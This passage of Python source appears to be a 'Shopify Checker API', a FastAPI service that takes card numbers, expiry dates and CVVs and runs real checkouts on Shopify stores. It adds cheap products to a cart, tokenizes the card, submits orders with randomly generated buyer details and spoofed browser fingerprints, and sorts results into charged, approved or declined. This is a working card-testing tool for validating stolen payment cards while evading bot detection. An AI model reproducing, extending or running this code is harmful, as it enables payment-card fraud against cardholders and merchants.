        await asyncio.sleep(random.uniform(0.3, 0.9))
    except Exception:
        pass
    try:
        cached = _get_cached_products(site)
        if cached:
            products = cached
            _steps.append("1. Products: cached")
        else:
            product_response = await session.get(site + "/products.json", headers=product_header)
            _steps.append(f"1. Products: HTTP {product_response.status_code}")
            if product_response.status_code != 200:
                return {"status": "Error", "message": f"Products page HTTP {product_response.status_code}", "debug_steps": _steps}
            try:
                products_data = product_response.json()
            except Exception:
                return {"status": "Error", "message": "Products page not JSON (site may be down)", "debug_steps": _steps}
            products = products_data.get("products") or []
            if products:
                _set_cached_products(site, products)
        if not products:
            return {"status": "Error", "message": "No products found", "debug_steps": _steps}
        lowest_price = None
        lowest_product = None
        lowest_variant = None
        for product in products:
            variants = product.get("variants") or []
            for v in variants:
                available = v.get("available", True)
                if isinstance(available, str):
                    available = available.lower() in ("true", "1", "yes")
                if not available:
                    continue
                price_str = v.get("price") or "0"
                try:
                    price_val = float(str(price_str).replace("$", "").replace(",", "").strip())
                except (ValueError, TypeError):
                    continue
                if price_val < 10.0 or price_val > 40.0:
                    continue
                if lowest_price is None or price_val < lowest_price:
                    lowest_price = price_val
                    lowest_product = product
                    lowest_variant = v
        if lowest_product is None or lowest_variant is None:
            return {"status": "Error", "message": "No available products in price range", "debug_steps": _steps}
        product_handle = lowest_product["handle"]
        variant_id = lowest_variant["id"]
        price = lowest_variant["price"]
        product_title = lowest_product["title"]
        _steps.append(f"2. Product: {product_title[:40]} | ${price} | variant={variant_id}")
        _log_verbose(verbose, f"✅ Product: {product_title[:40]} price={price}", discord_webhook=discord_console_webhook)
    except Exception as e:
        return {"status": "Error", "message": f"Product fetch: {str(e)[:100]}", "debug_steps": _steps}
    try:
        await asyncio.sleep(random.uniform(0.4, 1.2))
        browse_headers = {k: v for k, v in product_header.items()}
        browse_headers["Referer"] = site + "/"
        browse_headers["Sec-Fetch-Dest"] = "document"
        browse_headers["Sec-Fetch-Mode"] = "navigate"
        browse_headers["Sec-Fetch-Site"] = "same-origin"
        browse_headers["Sec-Fetch-User"] = "?1"
        try:
            await session.get(f"{site}/collections/all", headers=browse_headers)
            await asyncio.sleep(random.uniform(0.3, 0.8))
        except Exception:
            pass
        browse_headers["Referer"] = f"{site}/collections/all"
        try:
            await session.get(f"{site}/products/{product_handle}", headers=browse_headers)
        except Exception:
            pass
        await asyncio.sleep(random.uniform(0.5, 1.5))
        cart_add_headers = {k: v for k, v in product_header.items()}
        cart_add_headers["Referer"] = f"{site}/products/{product_handle}"
        cart_add_headers["Sec-Fetch-Dest"] = "empty"
        cart_add_headers["Sec-Fetch-Mode"] = "cors"
        cart_add_headers["Sec-Fetch-Site"] = "same-origin"
        cart_add_headers["content-type"] = "application/x-www-form-urlencoded"
        cart_add_headers["origin"] = site
        cart_add_headers["X-Requested-With"] = "XMLHttpRequest"
        cart_add_headers.pop("Sec-Fetch-User", None)
        cart_add_headers.pop("Upgrade-Insecure-Requests", None)
        add_data = {"id": str(variant_id), "quantity": "1", "form_type": "product"}
        response = await session.post(site + "/cart/add.js", headers=cart_add_headers, data=add_data)
        if response.status_code != 200:
            return {"status": "Error", "message": "Cart add failed", "debug_steps": _steps}
        _steps.append(f"3. Cart add: HTTP {response.status_code}")
        _log_verbose(verbose, "✅ Cart add OK", discord_webhook=discord_console_webhook)
        await asyncio.sleep(random.uniform(0.3, 0.8))
        cart_response = await session.get(f"{site}/cart.js", headers=cart_add_headers)
        try:
            cart_data = cart_response.json()
        except Exception:
            return {"status": "Error", "message": "Cart JSON parse failed", "debug_steps": _steps}
        token = cart_data.get("token")
        if not token:
            return {"status": "Error", "message": "No cart token", "debug_steps": _steps}
    except _NETWORK_ERRORS as e:
        return {"status": "Error", "message": f"Network: {type(e).__name__}"}
    await asyncio.sleep(random.uniform(0.5, 1.2))
    checkout_headers = {
        "User-Agent": fingerprint.get("User-Agent", shop.user_agent),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"),
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "content-type": "application/x-www-form-urlencoded",
        "origin": site,
        "referer": f"{site}/cart",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
    }
    for _ch_key in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform", "Sec-Ch-Ua-Full-Version-List"):
        if _ch_key in fingerprint:
            checkout_headers[_ch_key] = fingerprint[_ch_key]
    try:
        checkout_response = await session.post(f"{site}/cart", headers=checkout_headers, data={"checkout": "", "updates[]": "1"})
    except _NETWORK_ERRORS as e:
        return {"status": "Error", "message": f"Network: {type(e).__name__}", "debug_steps": _steps}
    checkout_page_url = str(checkout_response.url)
    response_text2 = checkout_response.text
    x_st = _RE_SESSION_TOKEN.search(response_text2)
    session_token = x_st.group(1) if x_st else None
    if not session_token:
        return {"status": "Error", "message": "Checkout session failed", "debug_steps": _steps}
    _steps.append(f"4. Checkout: HTTP {checkout_response.status_code} | url={checkout_page_url[:60]}")
    _log_verbose(verbose, "✅ Checkout session OK", discord_webhook=discord_console_webhook)
    queue_token = find_between(response_text2, 'queueToken&quot;:&quot;', '&quot;')
    stable_id = find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
    paymentMethodIdentifier = find_between(response_text2, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
    _checkpoint_token = find_between(response_text2, 'checkpointToken&quot;:&quot;', '&quot;')
    if not _checkpoint_token:
        _checkpoint_token = find_between(response_text2, 'captchaToken&quot;:&quot;', '&quot;')
    if not _checkpoint_token:
        _checkpoint_token = find_between(response_text2, '"checkpointToken":"', '"')
    _checkpoint_data = {"token": _checkpoint_token} if _checkpoint_token else None
    delivery_line_stable_id = _extract_delivery_line_stable_id(response_text2)
    requires_shipping = _detect_requires_shipping(response_text2)
    if requires_shipping is None:
        requires_shipping = True
    delivery_strategy_handle = _extract_delivery_strategy_handle(response_text2)
    delivery_option_handle = None
    _log_verbose(verbose, f"✅ requires_shipping={requires_shipping}, delivery_strategy_handle={delivery_strategy_handle[:20] + '...' if delivery_strategy_handle else None}", discord_webhook=discord_console_webhook)
    random_info = shop.get_random_info()
    fname, lname = random_info["fname"], random_info["lname"]
    email, phone = random_info["email"], random_info["phone"]
    add1 = random_info["add1"]
    city = random_info["city"]
    state_short = random_info["state_short"]
    zip_code = str(random_info["zip"])
    await asyncio.sleep(random.uniform(1.0, 2.5))
    _token_endpoints = ["https://deposit.us.shopifycs.com/sessions", "https://checkout.pci.shopifyinc.com/sessions", "https://checkout.shopifycs.com/sessions"]
    _card_json = {"credit_card": {"number": cc, "month": mon, "year": year, "verification_value": cvv, "name": f"{fname} {lname}"}, "payment_session_scope": urlparse(site_url).netloc}
    _tok_chrome_ver = fingerprint.get("_chrome_ver")
    _tok_headers = {"accept": "application/json", "content-type": "application/json", "origin": "https://checkout.shopifycs.com", "referer": "https://checkout.shopifycs.com/", "user-agent": shop.user_agent, "accept-language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"), "accept-encoding": "gzip, deflate, br, zstd", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site"}
    for _ch_key in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform"):
        if _ch_key in fingerprint:
            _tok_headers[_ch_key.lower()] = fingerprint[_ch_key]
    async def _try_tokenize_sequential(endpoints, px=None):
        try:
            async with _create_async_client(proxy_url=px, timeout=15.0, chrome_version=_tok_chrome_ver) as tok_sess:
                for ep in endpoints:
                    try:
                        r = await tok_sess.post(ep, headers=_tok_headers, json=_card_json)
                        if r.status_code == 200:
                            sid = r.json().get("id")
                            if sid:
                                return sid
                    except Exception:
                        continue
        except Exception:
            pass
        return None
    async def _tokenize_card():
        sid = await _try_tokenize_sequential(_token_endpoints, px=None)
        if sid:
            return sid
        if proxy_url:
            sid = await _try_tokenize_sequential(_token_endpoints, px=proxy_url)
            if sid:
                return sid
        return None
    sessionid = await _tokenize_card()
    if not sessionid:
        return {"status": "Error", "message": "Payment session failed", "debug_steps": _steps}
    _steps.append(f"5. Payment session: OK | sid={sessionid[:20]}...")
    _log_verbose(verbose, "✅ Payment session OK", discord_webhook=discord_console_webhook)
    graphql_url = f"{site_url}/checkouts/unstable/graphql"
    _query = "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"
    def _make_graphql_headers():
        h = {"accept": "application/json", "content-type": "application/json", "origin": site_url, "referer": f"{site_url}/", "user-agent": shop.user_agent, "accept-language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"), "accept-encoding": "gzip, deflate, br, zstd", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "x-checkout-one-session-token": session_token, "x-checkout-web-deploy-stage": "production", "x-checkout-web-server-handling": "fast", "x-checkout-web-source-id": token.split("?")[0] if "?" in token else token}
        for _ch_key in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform", "Sec-Ch-Ua-Full-Version-List"):
            if _ch_key in fingerprint:
                h[_ch_key] = fingerprint[_ch_key]
        return h
    def _delivery_kwargs():
        return dict(requires_shipping=requires_shipping, delivery_strategy_handle=delivery_strategy_handle, delivery_option_handle=delivery_option_handle)
    neg_got_receipt = False
    await asyncio.sleep(random.uniform(0.8, 1.8))
    if requires_shipping:
        _log_verbose(verbose, "✅ Negotiating shipping rates...", discord_webhook=discord_console_webhook)
        neg_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012x}"
        neg_payload = {
            "query": _query,
            "variables": {
                "input": {
                    "checkpointData": _checkpoint_data,
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_code, fname, lname, state_short, phone, destination_changed=True, **_delivery_kwargs()),
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True},
                            "merchandise": {
                                "productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None},
                            },
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }],
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": paymentMethodIdentifier,
                                    "sessionId": sessionid,
                                    "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
                                },
                            },
                            "amount": {"any": True},
                            "dueAt": None,
                        }],
                        "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
                    },
                    "buyerIdentity": {"buyerIdentity": {"presentmentCurrency": "USD", "countryCode": "US"}, "contactInfoV2": {"emailOrSms": {"value": email, "emailOrSmsChanged": False}}, "marketingConsent": [{"email": {"value": email}}], "shopPayOptInPhone": {"countryCode": "US"}},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": f"{token}-neg-{random.random()}",
                "metafields": [],
                "analytics": {"requestUrl": f"{site_url}/checkouts/cn/{token}", "pageId": neg_page_id},
            },
            "operationName": "SubmitForCompletion",
        }
        neg_resp = await session.post(graphql_url, headers=_make_graphql_headers(), json=neg_payload)
        if neg_resp.status_code == 200:
            neg_data = neg_resp.json()
            neg_completion = neg_data.get("data", {}).get("submitForCompletion", {}) or {}
            neg_receipt = neg_completion.get("receipt")
            if neg_receipt and neg_receipt.get("id"):
                neg_got_receipt = True
                _log_verbose(verbose, "✅ Negotiation returned receipt directly!", discord_webhook=discord_console_webhook)
            else:
                _log_verbose(verbose, "✅ Shipping negotiated", discord_webhook=discord_console_webhook)
        else:
            _log_verbose(verbose, f"⚠️ Negotiation HTTP {neg_resp.status_code}, continuing...", discord_webhook=discord_console_webhook)
        if neg_got_receipt:
            receipt = neg_receipt
            receipt_id = receipt.get("id")
            if receipt.get("__typename") == "ProcessingReceipt":
                poll_delay = 0.25
                for poll_i in range(8):
                    await asyncio.sleep(min(poll_delay + poll_i * 0.06, 0.7))
                    poll_r = await session.post(graphql_url, headers=_make_graphql_headers(), json={"query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}", "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"})
                    if poll_r.status_code != 200:
                        continue
                    rec = poll_r.json().get("data", {}).get("receipt", {})
                    if rec.get("__typename") == "ProcessedReceipt" or rec.get("orderIdentity"):
                        return {"status": "Charged", "message": "CARD CHARGED", "order_id": rec.get("orderIdentity", {}).get("id"), "product": product_title, "price": price, "raw_receipt": rec}
                    if rec.get("__typename") == "ActionRequiredReceipt":
                        return {"status": "Approved", "message": "3DS Required", "error_code": "3DS_REQUIRED", "product": product_title, "price": price, "raw_receipt": rec}
                    if rec.get("__typename") == "FailedReceipt":
                        err = rec.get("processingError", {}) or {}
                        _fc = err.get("code", "UNKNOWN")
                        if _fc == "CAPTCHA_REQUIRED":
                            return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": rec}
                        return {"status": "Declined", "message": "Card declined", "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": rec}
                return {"status": "Error", "message": "Poll timeout", "product": product_title, "price": price}
            elif receipt.get("__typename") == "FailedReceipt":
                err = receipt.get("processingError", {}) or {}
                _fc = err.get("code", "UNKNOWN")
                if _fc == "CAPTCHA_REQUIRED":
                    return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": receipt}
                return {"status": "Declined", "message": "Card declined", "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": receipt}
            elif receipt.get("__typename") == "ProcessedReceipt" or receipt.get("orderIdentity"):
                return {"status": "Charged", "message": "CARD CHARGED", "order_id": receipt.get("orderIdentity", {}).get("id"), "product": product_title, "price": price, "raw_receipt": receipt}
        try:
            ref = await session.get(checkout_page_url, headers={"User-Agent": shop.user_agent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
            if ref.status_code == 200:
                rt = ref.text
                nst = _RE_SESSION_TOKEN.search(rt)
                if nst:
                    session_token = nst.group(1)
                nq = find_between(rt, 'queueToken&quot;:&quot;', '&quot;')
                if nq:
                    queue_token = nq
                ns = find_between(rt, 'stableId&quot;:&quot;', '&quot;')
                if ns:
                    stable_id = ns
                np_ = find_between(rt, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                if np_:
                    paymentMethodIdentifier = np_
                nd = _extract_delivery_line_stable_id(rt)
                if nd:
                    delivery_line_stable_id = nd
                nds = _extract_delivery_strategy_handle(rt)
                if nds:
                    delivery_strategy_handle = nds
                _log_verbose(verbose, "✅ Tokens refreshed after negotiation", discord_webhook=discord_console_webhook)
        except Exception as e:
            _log_verbose(verbose, f"⚠️ Re-fetch warning: {e}", discord_webhook=discord_console_webhook)
        new_sid = await _tokenize_card()
        if new_sid:
            sessionid = new_sid
            _log_verbose(verbose, "✅ Payment session refreshed after negotiation", discord_webhook=discord_console_webhook)
        else:
            _log_verbose(verbose, "⚠️ Re-tokenize failed, using original session", discord_webhook=discord_console_webhook)
    else:
        _log_verbose(verbose, "✅ Digital product (no shipping needed)", discord_webhook=discord_console_webhook)
    _max_submit_attempts = 1
    for attempt in range(_max_submit_attempts):
        graphql_headers = _make_graphql_headers()
        random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012x}"
        graphql_payload = {
            "query": _query,
            "variables": {
                "input": {
                    "checkpointData": _checkpoint_data,
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_code, fname, lname, state_short, phone, destination_changed=False, **_delivery_kwargs()),
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True},
                            "merchandise": {
                                "productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None},
                            },
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }],
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": paymentMethodIdentifier,
                                    "sessionId": sessionid,
                                    "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
                                },
                            },
                            "amount": {"any": True},
                            "dueAt": None,
                        }],
                        "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
                    },
                    "buyerIdentity": {"buyerIdentity": {"presentmentCurrency": "USD", "countryCode": "US"}, "contactInfoV2": {"emailOrSms": {"value": email, "emailOrSmsChanged": False}}, "marketingConsent": [{"email": {"value": email}}], "shopPayOptInPhone": {"countryCode": "US"}},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"any": True}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": f"{token}-{random.random()}",
                "metafields": [],
                "analytics": {"requestUrl": f"{site_url}/checkouts/cn/{token}", "pageId": random_page_id},
            },
            "operationName": "SubmitForCompletion",
        }
        _log_verbose(verbose, f"✅ Submit attempt {attempt + 1}/{_max_submit_attempts}", discord_webhook=discord_console_webhook)
        gr = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
        _steps.append(f"6. Submit #{attempt+1}: HTTP {gr.status_code}")
        if gr.status_code != 200:
            last_completion = {"__typename": "HttpError", "status": gr.status_code}
            return {"status": "Error", "message": f"GraphQL {gr.status_code}", "debug_steps": _steps}
        result_data = gr.json()
        completion = result_data.get("data", {}).get("submitForCompletion", {}) or {}
        last_completion = completion
        top_errors = result_data.get("errors")
        if top_errors:
            last_graphql_errors = top_errors
            if verbose:
                _log_verbose(verbose, f"GraphQL errors: {top_errors[:2]}", discord_webhook=discord_console_webhook)
        if completion.get("errors"):
            error_codes = [e.get("code") for e in completion["errors"] if e.get("code")]
            _approval_codes = {
                "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS",
                "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVC",
                "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
            }
            _decline_codes = {
                "PAYMENTS_CREDIT_CARD_BASE_STOLEN_CARD",
                "PAYMENTS_CREDIT_CARD_BASE_LOST_CARD",
                "PAYMENTS_CREDIT_CARD_BASE_FRAUDULENT",
                "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE",
                "PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR",
                "PAYMENTS_CREDIT_CARD_BASE_PICKUP_CARD",
                "PAYMENTS_CREDIT_CARD_BASE_INVALID_NUMBER",
                "PAYMENTS_CREDIT_CARD_BASE_INVALID_EXPIRY",
                "PAYMENTS_CREDIT_CARD_BASE_CALL_ISSUER",
                "GENERIC_ERROR",
            }
            _site_skip_codes = {
                "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP",
                "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE",
                "PAYMENTS_INVALID_GATEWAY_FOR_DEVELOPMENT_STORE",
                "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
                "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE",
                "REQUIRED_ARTIFACTS_UNAVAILABLE",
            }
            approval_hits = [c for c in error_codes if c in _approval_codes]
            decline_hits = [c for c in error_codes if c in _decline_codes or c.startswith("PAYMENTS_CREDIT_CARD_BASE_")]
            site_hits = [c for c in error_codes if c in _site_skip_codes]
            if approval_hits:
                _steps.append(f"7. Result: APPROVED | code={approval_hits[0]}")
                return {"status": "Approved", "message": "Card approved by gateway", "error_code": approval_hits[0], "product": product_title, "price": price, "raw_receipt": {"errors": error_codes, "__typename": completion.get("__typename", "SubmitAlreadyAccepted")}, "debug_steps": _steps}
            if decline_hits:
                _steps.append(f"7. Result: DECLINED | code={decline_hits[0]}")
                return {"status": "Declined", "message": "Card declined", "error_code": decline_hits[0], "product": product_title, "price": price, "raw_receipt": {"errors": error_codes, "__typename": completion.get("__typename", "SubmitAlreadyAccepted")}, "debug_steps": _steps}
            if site_hits:
                _steps.append(f"7. Result: SITE_ERROR | codes={error_codes}")
                return {"status": "Error", "message": ", ".join(error_codes), "error_code": "SITE_INCOMPATIBLE", "product": product_title, "price": price, "debug_steps": _steps}
            _steps.append(f"7. Result: ERROR | codes={error_codes}")
            return {"status": "Error", "message": ", ".join(error_codes), "product": product_title, "price": price, "debug_steps": _steps}
        receipt = completion.get("receipt")
        if not receipt:
            tn = completion.get("__typename", "?")
            reason = completion.get("reason", "")
            errs = completion.get("errors") or []
            if tn == "CheckpointDenied":
                _redirect_url = completion.get("redirectUrl") or checkout_page_url
                return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "_checkout_url": _redirect_url}
            if tn in ("Throttled", "TooManyRequests"):
                return {"status": "Error", "message": "Throttled by Shopify", "error_code": "THROTTLED", "product": product_title, "price": price}
            if verbose:
                keys = list(completion.keys())
                _log_verbose(verbose, f"No receipt | typename={tn} | keys={keys} | reason={reason!r} | errors={errs[:2] if errs else []}", discord_webhook=discord_console_webhook)
            else:
                _log_verbose(verbose, f"No receipt (typename={tn})", discord_webhook=discord_console_webhook)
            return {"status": "Error", "message": f"No receipt ({tn})", "product": product_title, "price": price, "debug_steps": _steps}
        receipt_id = receipt.get("id")
        if receipt.get("__typename") == "ProcessingReceipt":
            poll_delay = 0.25
            for poll_i in range(8):
                await asyncio.sleep(min(poll_delay + poll_i * 0.06, 0.7))
                poll_r = await session.post(graphql_url, headers=graphql_headers, json={"query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}", "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"})
                if poll_r.status_code != 200:
                    continue
                poll_data = poll_r.json()
                rec = poll_data.get("data", {}).get("receipt", {})
                if rec.get("__typename") == "ProcessedReceipt" or rec.get("orderIdentity"):
                    _steps.append(f"7. Receipt: CHARGED | order={rec.get('orderIdentity', {}).get('id', 'N/A')}")
                    return {"status": "Charged", "message": "CARD CHARGED", "order_id": rec.get("orderIdentity", {}).get("id"), "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
                if rec.get("__typename") == "ActionRequiredReceipt":
                    _steps.append("7. Receipt: 3DS_REQUIRED (Approved)")
                    return {"status": "Approved", "message": "3DS Required", "error_code": "3DS_REQUIRED", "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
                if rec.get("__typename") == "FailedReceipt":
                    err = rec.get("processingError", {}) or {}
                    code = err.get("code", "UNKNOWN")
                    msg_orig = err.get("messageUntranslated", "") or err.get("message", "")
                    if verbose:
                        _log_verbose(verbose, f"FailedReceipt: code={code} messageUntranslated={msg_orig!r}", discord_webhook=discord_console_webhook)
                    if code == "CAPTCHA_REQUIRED":
                        _steps.append(f"7. Receipt: CAPTCHA_REQUIRED")
                        return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
                    approval_codes = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC"}
                    if code in approval_codes or "INSUFFICIENT" in code or "CVC" in code or "CVV" in code:
                        _steps.append(f"7. Receipt: APPROVED | code={code} | msg={msg_orig}")
                        return {"status": "Approved", "message": "Card approved by gateway", "error_code": code, "gateway_message": msg_orig or None, "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
                    _steps.append(f"7. Receipt: DECLINED | code={code} | msg={msg_orig}")
                    return {"status": "Declined", "message": "Card declined", "error_code": code, "gateway_message": msg_orig or None, "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
            return {"status": "Error", "message": "Poll timeout", "product": product_title, "price": price, "debug_steps": _steps}
    msg = "Submit failed"
    if last_graphql_errors:
        first = last_graphql_errors[0] if last_graphql_errors else {}
        gql_msg = first.get("message") or first.get("messageUntranslated") or str(first)[:120]
        msg = f"Submit failed: {gql_msg}"
    elif last_completion:
        tn = last_completion.get("__typename", "")
        if tn == "CheckpointDenied":
            _steps.append("7. Result: CAPTCHA_REQUIRED")
            return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "debug_steps": _steps, "_checkout_url": checkout_page_url}
        elif tn == "SubmitFailed" and last_completion.get("reason"):
            msg = f"Submit failed: {last_completion.get('reason', '')}"
        elif tn == "SubmitRejected" and last_completion.get("errors"):
            codes = [e.get("code") for e in last_completion["errors"] if e.get("code")]
            if codes:
                msg = f"Submit failed: {', '.join(codes)}"
        elif tn == "Throttled":
            msg = "Submit failed: Throttled"
        elif tn == "HttpError":
            msg = f"Submit failed: HTTP {last_completion.get('status', '?')}"
    _steps.append(f"7. Result: ERROR | {msg}")
    return {"status": "Error", "message": msg, "product": product_title, "price": price, "debug_steps": _steps}

# ------------------------------------------------------------
# FASTAPI APPLICATION
# ------------------------------------------------------------
app = FastAPI(title="Shopify Checker API", description="Full checkout with TLS fingerprinting")

@app.get("/shopify")
async def shopify_check(
    site: str = Query(..., description="Shopify store URL (e.g., https://example.myshopify.com)"),
    cc: str = Query(..., description="Card details: cc|mm|yyyy|cvv"),
    proxy: Optional[str] = Query(None, description="Optional proxy (ip:port or user:pass@ip:port)")
):
    """
